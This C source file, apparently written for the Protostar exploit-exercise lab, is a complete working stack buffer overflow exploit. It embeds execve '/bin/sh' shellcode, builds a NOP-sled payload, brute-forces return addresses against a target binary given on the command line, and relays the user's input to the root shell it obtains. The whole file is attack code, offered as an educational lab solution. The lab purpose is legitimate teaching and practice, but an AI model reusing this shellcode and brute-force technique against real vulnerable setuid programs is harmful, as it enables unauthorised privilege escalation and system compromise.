/*
* License
* Copyright (c) 2017 Ng Chiang Lin
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* This code is provided and to be used for educational purpose only.
* Computer misuse is a serious crime in Singapore and other
* countries, punishable by law.
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/


/*

This code is provided and to be used for educational purpose only.
Computer misuse is a serious crime in Singapore and other
countries, punishable by law. 

Simple C program to exploit stack overflow in protostar 
exploit exercise stack1, stack0, stack3, stack4 and stack5 
to launch a shell. 

This program takes a single argument, the full path to the
program to be exploited. 

Ng Chiang Lin
April 2017

*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>

static unsigned char shellcode[]={
'\xeb','\x16','\x31','\xc0','\x5b','\x88','\x43','\x07','\x89','\x5b',
'\x08','\x89','\x43','\x0c','\xb0','\x0b','\x8d','\x4b','\x08','\x8d',
'\x53','\x0c','\xcd','\x80','\xe8','\xe5','\xff','\xff','\xff','\x2f',
'\x62','\x69','\x6e','\x2f','\x73','\x68'};

static volatile sig_atomic_t success = 0;
static int signal_flag = 0;

/* 
Total buffer for exploit contains payload, NOP sled and return address
This should be bigger than the target buffer that we are exploiting
*/
#define BUFSZ 128  

/* The target buffer size that we intend to overflow */ 
#define TBUFSZ 64  

/* The maximum offset for the return address */
#define MAXOFF 256

#define ADDRLEN 4

/* 
The initial return address based on the stack value
This should be set high up in memory and we will try
to find the correct return address by moving down based
on offset * 4 bytes subtracted from this address   
*/
#define RET 0xbfffff00
#define READBUF 1024


/* Function to prepare and setup payload */
void setpayload(unsigned char* buf, int offset )
{

   unsigned char addr[ADDRLEN], tmp;
   size_t shellsz, i, j;
   unsigned int ret_addr=RET, mask=0xff;

   //Get the size of the shell code
   shellsz = sizeof(shellcode); 

   if(shellsz > TBUFSZ)
   {//For this exploit we don't allow shell code larger than
    //the target buffer
      fprintf(stderr, "Shell code exceeds target buffer\n");
      exit(EXIT_FAILURE);
   }

   //Fill the front of the target buffer with NOP instruction 0x90
   for(i=0; i< TBUFSZ - shellsz ; i++)
       buf[i] = '\x90'; 

   //Fill the rest of the target buffer with the shellcode
   for(j=0; i<TBUFSZ;j++,i++)
       buf[i]=shellcode[j]; 
   
  //Calculate the return addr
  ret_addr = ret_addr - (offset * 4);
  
  //Convert return addr to char
  for(i=0; i< ADDRLEN; i++)
  {
     tmp = (unsigned char)(ret_addr & mask);
     addr[i]=tmp;
     ret_addr = ret_addr >> 8 ;
  }

  if((BUFSZ - TBUFSZ) <=0)
  {
     fprintf(stderr, "Payload size must be bigger than target buffer\n");
     exit(EXIT_FAILURE);
  }

  //Fill up the rest of the buf with the return addr
  i = BUFSZ - TBUFSZ;  
  j = 0;
  while(i<BUFSZ)
  {
     j = j % 4 ; 
     buf[i]=addr[j];
     i++; j++;
  }

}


/* The SIGPIPE signal handler function */
void pipe_sig(int signo)
{
    success=0; 
}


/* Sets up the signal handler to capture SIGPIPE */
void setPipeSignal(void)
{
   struct sigaction act; 
   act.sa_handler = pipe_sig; 
   sigemptyset(&act.sa_mask); 
   act.sa_flags = 0;
   act.sa_flags |= SA_RESTART; 

   if(sigaction(SIGPIPE, &act, NULL) < 0)
   {
      fprintf(stderr, "Unable to set pipe signal handler\n");
      exit(EXIT_FAILURE);
   }
}

/* Our parent exploit process */
void parent(int* parent_to_childstdin, unsigned char *buf, int offset, 
            int cpid, int *endstatus)
{

    char *cmd="echo You got root shell enter command! > /dev/null \r\n";
    char readbuf[READBUF];
    int i, child_status;
    ssize_t rsize;

    if (close(parent_to_childstdin[0]) == -1)
    {//close read pipe
       fprintf(stderr, "Parent unable to close read pipe\n");
       exit(EXIT_FAILURE);
    }
 

    if(signal_flag != 1)
    {
       setPipeSignal();
       signal_flag=1; 
    }

    setpayload(buf,offset);
    printf("%d Exploiting the stack at return address %x\n", 
            offset, (RET - (offset * 4)));
     
    if(write(parent_to_childstdin[1], buf, BUFSZ) != BUFSZ)
    {
           fprintf(stderr, "Error writing exploit to child\n");
    }

    success=1;
    //flush the pipe by keep writing to it, SIGPIPE will be triggered 
    //if child process terminates
    for(i=0;i<10000;i++)
    {
        write(parent_to_childstdin[1], cmd, strlen(cmd) + 1);
    }
    
    if(success)
    {
        *endstatus=1;
        printf("%s\n%s\n", "Congrats you got root shell !", 
        "Enter your command (To exit, type exit and enter or press ctrl-c)");
        while(success)
        {
           rsize  = read(STDIN_FILENO, readbuf, READBUF);
           if(rsize <= 0)
              break;   

           if(write(parent_to_childstdin[1], readbuf, rsize) != rsize)
           {
              fprintf(stderr, "Error writing to child pipe\n");
           }

        }
     }

     if(waitpid(cpid, &child_status, 0) != -1)      
     {
          printf("Child process exited with status %d\n", child_status );
     }
     else
     {
          fprintf(stderr, "Unable to waitpid on child\n");
     }

    if (close(parent_to_childstdin[1]) == -1)
    {
       fprintf(stderr, "Parent unable to close write pipe\n");
       exit(EXIT_FAILURE);
    }

}

/* The child process running the target program to be exploited */
void child(int* parent_to_childstdin, char *program)
{
    char *homepath, *homeenv;
    char *environ[3], *argv[2];
    size_t bufsize;
    int ret;

    if(close(parent_to_childstdin[1]) == -1)
    {//close write pipe
        fprintf(stderr, "Error child unable to close write pipe\n");
        exit(EXIT_FAILURE);
    }


    if(parent_to_childstdin[0] != STDIN_FILENO)
    {
        if(dup2(parent_to_childstdin[0],STDIN_FILENO) != STDIN_FILENO)
        {
           fprintf(stderr, "Error setting child stdin to pipe\n");
           exit(EXIT_FAILURE);
        }
    }

    homepath = getenv("HOME");     
    if(homepath == NULL)
    {
        fprintf(stderr, "Error getting home env variable\n");
        exit(EXIT_FAILURE);
    }

    bufsize = strlen("HOME=") + strlen(homepath) + 1; 
      
    if ( (homeenv = calloc(bufsize + 10, sizeof(char))) == NULL )
    {
       fprintf(stderr, "Error allocating memory for home env variable\n");
       exit(EXIT_FAILURE);
    }

    ret = (int)(bufsize -1);
     
    if( snprintf(homeenv, bufsize, "%s%s", "HOME=", homepath) != ret )
    {
       fprintf(stderr, "Error formating home env\n");
       exit(EXIT_FAILURE);
    }      

    environ[0]="PATH=/bin:/usr/bin";
    environ[1]=homeenv;
    environ[2]=NULL;

    argv[0]="stack5";
    argv[1]=NULL;

    if( execve(program, argv, environ) == -1)
    {
        fprintf(stderr, "Error executing child program\n");
        close(parent_to_childstdin[0]);
        free(homeenv);
        exit(EXIT_FAILURE);
    }

}



int main(int argc, char* argv[])
{

   int parent_to_childstdin[2];
   int cpid, offset = 0, endstatus=0;
   unsigned char buf[BUFSZ];
   char *prog;


   if(argc < 2)
   {
     fprintf(stderr, "%s%s\n", 
           "Simple program to obtain root from protostar exploit exercises,",
            " stack0, stack3, stack4, stack5 buffer overflow vulnerability");
     fprintf(stderr, "%s\n", 
            "Program requires an argument <full path to program to exploit>");
     fprintf(stderr, "Usage: %s <full path to progam to be exploited>\n", argv[0]); 
     fprintf(stderr, "Usage Example: %s /opt/protostar/bin/stack5\n", argv[0]);
     exit(EXIT_FAILURE);
   }

   prog=argv[1];
   if( prog[0] != '/')
   {
      fprintf(stderr, "Use absolute path for program to be exploited. Eg. /opt/protostar/bin/stack5\n");
      exit(EXIT_FAILURE); 
   }

   while(offset < MAXOFF)
   {

       if(pipe(parent_to_childstdin)< 0)
       {
          fprintf(stderr, "Error creating pipe\n");
          exit(EXIT_FAILURE);
       }   

       cpid = fork();
       if(cpid < 0)
       {
            fprintf(stderr, "Error forking child process\n");
            exit(EXIT_FAILURE);
       }
       else if(cpid > 0)
       {//parent process
         printf("Attempt %d\n", offset);
         parent(parent_to_childstdin, buf, offset,cpid, &endstatus);
         offset++; 
             
         if(endstatus)
            return 0;

       }
       else
       {//child process
           child(parent_to_childstdin, argv[1]);

       }

   } 

  return 0;

}


